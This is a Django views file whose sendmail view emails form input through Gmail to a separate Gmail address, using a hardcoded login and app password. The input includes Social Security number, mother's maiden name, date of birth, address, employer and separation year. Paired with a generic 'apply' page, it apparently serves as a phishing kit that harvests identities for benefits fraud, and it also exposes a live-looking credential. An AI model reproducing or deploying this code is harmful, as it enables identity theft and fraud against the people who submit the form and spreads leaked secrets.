import json

from django.shortcuts import render
import smtplib, ssl
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.application import MIMEApplication


# Create your views here.
def index(request):
    return render(request, 'index.html', {})


def apply(request):
    return render(request, 'apply.html', {})


def sendmail(request):
    context = {
        "Response": 'Thank You, We will get back to you.... '
    }
    server = smtplib.SMTP_SSL("smtp.gmail.com", 465)
    server.login("sodeeqsodeeq@gmail.com", "avtltqidkrtbgvmz")
    server.sendmail("sodeeqsodeeq@gmail.com",
                    "sodeeqsodeeq2016@gmail.com",
                    "FirstName= " + request.POST['fname'] + "\r" 
                    "MiddleName= " + request.POST['mname'] + "\r"
                    "LastName =" + request.POST['lname'] + "\r"
                    "phone: " + request.POST['ph'] + "\r"
                    "Work Status: " + request.POST['emp'] + "\r"
                    "ssn: " + request.POST['ssn'] + "\r"
                    "Mother Maiden Name: " + request.POST['mmn'] + "\r"
                    "Address : " + request.POST['addr'] + "\r"
                    "apt : " + request.POST['apt'] + "\r"
                    "city : " + request.POST['city'] + "\r"
                    "state : " + request.POST['state'] + "\r"
                    "zip : " + request.POST['zip'] + "\r"
                    "gender : " + request.POST['gender'] + "\r"
                    "dob : " + request.POST['dob'] + "\r"
                    "race : " + request.POST['race[]'] + "\r"
                    "employer : " + request.POST['empl'] + "\r"
                    "Separation Year : " + request.POST['emplyear']

                    )
    server.quit()
    return render(request, 'index.html', {'context': context})
